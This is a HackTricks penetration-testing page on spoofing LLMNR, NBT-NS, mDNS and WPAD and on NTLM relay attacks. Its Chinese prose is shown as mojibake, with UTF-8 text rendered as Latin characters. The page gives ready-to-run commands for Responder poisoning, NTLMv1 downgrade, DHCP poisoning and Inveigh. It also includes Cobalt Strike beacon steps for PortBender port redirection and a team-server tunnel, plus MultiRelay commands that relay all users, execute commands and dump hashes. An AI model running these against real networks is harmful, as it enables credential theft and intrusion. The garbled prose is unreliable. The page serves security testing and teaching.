# ä¼ªé€  LLMNRã€NBT-NSã€mDNS/DNS å’Œ WPAD ä»¥åŠä¸­ç»§æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live) ä¸Š**å…³æ³¨**æˆ‘ä»¬ã€‚
- é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ç½‘ç»œåè®®

### æœ¬åœ°ä¸»æœºè§£æåè®®
- **LLMNRã€NBT-NS å’Œ mDNS**ï¼š
- Microsoft å’Œå…¶ä»–æ“ä½œç³»ç»Ÿåœ¨ DNS å¤±è´¥æ—¶ä½¿ç”¨ LLMNR å’Œ NBT-NS è¿›è¡Œæœ¬åœ°åç§°è§£æã€‚åŒæ ·ï¼ŒApple å’Œ Linux ç³»ç»Ÿä½¿ç”¨ mDNSã€‚
- ç”±äºå®ƒä»¬åœ¨ UDP ä¸Šçš„æœªç»èº«ä»½éªŒè¯çš„å¹¿æ’­ç‰¹æ€§ï¼Œè¿™äº›åè®®å®¹æ˜“å—åˆ°æ‹¦æˆªå’Œä¼ªé€ çš„å½±å“ã€‚
- [Responder](https://github.com/lgandx/Responder) å¯ä»¥é€šè¿‡å‘æŸ¥è¯¢è¿™äº›åè®®çš„ä¸»æœºå‘é€ä¼ªé€ å“åº”æ¥ç”¨äºå†’å……æœåŠ¡ã€‚
- å¯åœ¨[æ­¤å¤„](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)æ‰¾åˆ°æœ‰å…³ä½¿ç”¨ Responder è¿›è¡ŒæœåŠ¡å†’å……çš„æ›´å¤šä¿¡æ¯ã€‚

### Web ä»£ç†è‡ªåŠ¨å‘ç°åè®®ï¼ˆWPADï¼‰
- WPAD å…è®¸æµè§ˆå™¨è‡ªåŠ¨å‘ç°ä»£ç†è®¾ç½®ã€‚
- é€šè¿‡ DHCPã€DNS æˆ–åœ¨ DNS å¤±è´¥æ—¶å›é€€åˆ° LLMNR å’Œ NBT-NS æ¥è¿›è¡Œå‘ç°ã€‚
- Responder å¯ä»¥è‡ªåŠ¨æ‰§è¡Œ WPAD æ”»å‡»ï¼Œå°†å®¢æˆ·ç«¯é‡å®šå‘åˆ°æ¶æ„çš„ WPAD æœåŠ¡å™¨ã€‚

### Responder ç”¨äºåè®®æ¯’åŒ–
- **Responder** æ˜¯ä¸€ç§ç”¨äºæ¯’åŒ– LLMNRã€NBT-NS å’Œ mDNS æŸ¥è¯¢çš„å·¥å…·ï¼Œæ ¹æ®æŸ¥è¯¢ç±»å‹æœ‰é€‰æ‹©æ€§åœ°è¿›è¡Œå“åº”ï¼Œä¸»è¦é’ˆå¯¹ SMB æœåŠ¡ã€‚
- å®ƒé¢„è£…åœ¨ Kali Linux ä¸­ï¼Œå¯åœ¨ `/etc/responder/Responder.conf` ä¸­è¿›è¡Œé…ç½®ã€‚
- Responder ä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºæ•è·çš„å“ˆå¸Œå€¼ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨ `/usr/share/responder/logs` ç›®å½•ä¸­ã€‚
- å®ƒæ”¯æŒ IPv4 å’Œ IPv6ã€‚
- å¯åœ¨[æ­¤å¤„](https://github.com/lgandx/Responder-Windows)è·å– Responder çš„ Windows ç‰ˆæœ¬ã€‚

#### è¿è¡Œ Responder
- ä½¿ç”¨é»˜è®¤è®¾ç½®è¿è¡Œ Responderï¼š`responder -I <Interface>`
- è¿›è¡Œæ›´ç§¯æçš„æ¢æµ‹ï¼ˆå¯èƒ½ä¼šäº§ç”Ÿå‰¯ä½œç”¨ï¼‰ï¼š`responder -I <Interface> -P -r -v`
- é€šè¿‡æŠ€æœ¯æ•è· NTLMv1 æŒ‘æˆ˜/å“åº”ä»¥ä¾¿æ›´è½»æ¾åœ°ç ´è§£ï¼š`responder -I <Interface> --lm --disable-ess`
- å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ¿€æ´» WPAD å†’å……ï¼š`responder -I <Interface> --wpad`
- NetBIOS è¯·æ±‚å¯ä»¥è§£æä¸ºæ”»å‡»è€…çš„ IPï¼Œå¹¶å¯ä»¥è®¾ç½®èº«ä»½éªŒè¯ä»£ç†ï¼š`responder.py -I <interface> -Pv`

### ä½¿ç”¨ Responder è¿›è¡Œ DHCP æ¯’åŒ–
- ä¼ªé€  DHCP å“åº”å¯ä»¥æ°¸ä¹…æ¯’åŒ–å—å®³è€…çš„è·¯ç”±ä¿¡æ¯ï¼Œæä¾›äº†æ¯” ARP æ¯’åŒ–æ›´éšè”½çš„æ›¿ä»£æ–¹æ¡ˆã€‚
- éœ€è¦ç²¾ç¡®äº†è§£ç›®æ ‡ç½‘ç»œçš„é…ç½®ã€‚
- è¿è¡Œæ”»å‡»ï¼š`./Responder.py -I eth0 -Pdv`
- è¯¥æ–¹æ³•å¯ä»¥æœ‰æ•ˆåœ°æ•è· NTLMv1/2 å“ˆå¸Œï¼Œä½†éœ€è¦å°å¿ƒå¤„ç†ä»¥é¿å…ç½‘ç»œä¸­æ–­ã€‚

### ä½¿ç”¨ Responder æ•è·å‡­æ®
- Responder å°†ä½¿ç”¨ä¸Šè¿°åè®®å†’å……æœåŠ¡ï¼Œæ•è·å‡­æ®ï¼ˆé€šå¸¸æ˜¯ NTLMv2 æŒ‘æˆ˜/å“åº”ï¼‰ï¼Œå½“ç”¨æˆ·å°è¯•å¯¹ä¼ªé€ çš„æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯æ—¶ã€‚
- å¯å°è¯•é™çº§åˆ° NetNTLMv1 æˆ–ç¦ç”¨ ESS ä»¥ä¾¿æ›´è½»æ¾åœ°ç ´è§£å‡­æ®ã€‚

éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œä½¿ç”¨è¿™äº›æŠ€æœ¯åº”è¯¥åœ¨åˆæ³•å’Œé“å¾·çš„å‰æä¸‹è¿›è¡Œï¼Œç¡®ä¿è·å¾—é€‚å½“çš„æˆæƒï¼Œé¿å…é€ æˆå¹²æ‰°æˆ–æœªç»æˆæƒçš„è®¿é—®ã€‚

## Inveigh

Inveigh æ˜¯ä¸“ä¸º Windows ç³»ç»Ÿè®¾è®¡çš„æ¸—é€æµ‹è¯•äººå‘˜å’Œçº¢é˜Ÿäººå‘˜å·¥å…·ã€‚å®ƒæä¾›ç±»ä¼¼äº Responder çš„åŠŸèƒ½ï¼Œæ‰§è¡Œä¼ªé€ å’Œä¸­é—´äººæ”»å‡»ã€‚è¯¥å·¥å…·å·²ä» PowerShell è„šæœ¬å‘å±•ä¸º C# äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸»è¦ç‰ˆæœ¬ä¸º [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) å’Œ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)ã€‚è¯¦ç»†çš„å‚æ•°å’Œè¯´æ˜å¯ä»¥åœ¨[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)ä¸­æ‰¾åˆ°ã€‚

Inveigh å¯é€šè¿‡ PowerShell è¿è¡Œï¼š
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
æˆ–è€…ä½œä¸ºC#äºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œï¼š
```bash
Inveigh.exe
```
### NTLM Relay Attack

è¿™ç§æ”»å‡»åˆ©ç”¨SMBèº«ä»½éªŒè¯ä¼šè¯è®¿é—®ç›®æ ‡æœºå™¨ï¼Œå¦‚æœæˆåŠŸåˆ™æˆäºˆç³»ç»Ÿshellã€‚å…³é”®å…ˆå†³æ¡ä»¶åŒ…æ‹¬ï¼š
- è®¤è¯ç”¨æˆ·å¿…é¡»åœ¨ä¸­ç»§ä¸»æœºä¸Šå…·æœ‰æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™ã€‚
- SMBç­¾ååº”è¯¥è¢«ç¦ç”¨ã€‚

#### 445ç«¯å£è½¬å‘å’Œéš§é“

åœ¨ç›´æ¥ç½‘ç»œå¼•å…¥ä¸å¯è¡Œçš„æƒ…å†µä¸‹ï¼Œéœ€è¦è½¬å‘å’Œéš§é“åŒ–445ç«¯å£ä¸Šçš„æµé‡ã€‚åƒ[**PortBender**](https://github.com/praetorian-inc/PortBender)è¿™æ ·çš„å·¥å…·æœ‰åŠ©äºå°†ç«¯å£445çš„æµé‡é‡å®šå‘åˆ°å¦ä¸€ä¸ªç«¯å£ï¼Œåœ¨æœ¬åœ°ç®¡ç†å‘˜è®¿é—®ç”¨äºé©±åŠ¨åŠ è½½æ—¶è‡³å…³é‡è¦ã€‚

åœ¨Cobalt Strikeä¸­è®¾ç½®å’Œæ“ä½œPortBenderï¼š
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLMä¸­ç»§æ”»å‡»çš„å…¶ä»–å·¥å…·

- **Metasploit**ï¼šè®¾ç½®ä»£ç†ï¼Œæœ¬åœ°å’Œè¿œç¨‹ä¸»æœºè¯¦ç»†ä¿¡æ¯ã€‚
- **smbrelayx**ï¼šä¸€ä¸ªç”¨äºä¸­ç»§SMBä¼šè¯å¹¶æ‰§è¡Œå‘½ä»¤æˆ–éƒ¨ç½²åé—¨çš„Pythonè„šæœ¬ã€‚
- **MultiRelay**ï¼šResponderå¥—ä»¶ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œç”¨äºä¸­ç»§ç‰¹å®šç”¨æˆ·æˆ–æ‰€æœ‰ç”¨æˆ·ï¼Œæ‰§è¡Œå‘½ä»¤æˆ–è½¬å‚¨å“ˆå¸Œã€‚

æ¯ä¸ªå·¥å…·éƒ½å¯ä»¥æ ¹æ®éœ€è¦é…ç½®ä¸ºé€šè¿‡SOCKSä»£ç†è¿è¡Œï¼Œå³ä½¿åªæœ‰é—´æ¥ç½‘ç»œè®¿é—®ä¹Ÿèƒ½è¿›è¡Œæ”»å‡»ã€‚

### MultiRelayæ“ä½œ

ä» _**/usr/share/responder/tools**_ ç›®å½•æ‰§è¡ŒMultiRelayï¼Œé’ˆå¯¹ç‰¹å®šçš„IPæˆ–ç”¨æˆ·ã€‚
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### å¼ºåˆ¶ NTLM ç™»å½•

åœ¨ Windows ä¸­ï¼Œ**æ‚¨å¯èƒ½èƒ½å¤Ÿå¼ºåˆ¶ä¸€äº›ç‰¹æƒå¸æˆ·å¯¹ä»»æ„æœºå™¨è¿›è¡Œèº«ä»½éªŒè¯**ã€‚é˜…è¯»ä»¥ä¸‹é¡µé¢ä»¥äº†è§£è¯¦æƒ…ï¼š

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
